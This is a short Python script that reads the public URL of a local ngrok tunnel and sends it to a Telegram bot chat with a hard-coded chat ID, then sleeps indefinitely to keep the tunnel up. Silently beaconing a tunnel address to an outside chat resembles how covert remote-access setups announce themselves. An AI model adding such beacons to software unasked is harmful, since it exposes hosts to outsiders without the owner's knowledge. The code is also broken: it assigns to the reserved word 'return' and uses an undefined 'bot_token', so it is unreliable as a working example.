import json
import requests
import time

def get_ngrok_url():
    url = "http://localhost:4040/api/tunnels"
    res = requests.get(url)
    res_unicode = res.content.decode("utf-8")
    res_json = json.loads(res_unicode)
    return res_json["tunnels"][0]["public_url"][6:]

return = get_ngrok_url()
api_url = "https://api.telegram.org/bot{}/sendMessage?chat_id=809977861&text={}".format(bot_token,return)
requests.get(api_url)

while True:
	time.sleep(1000)
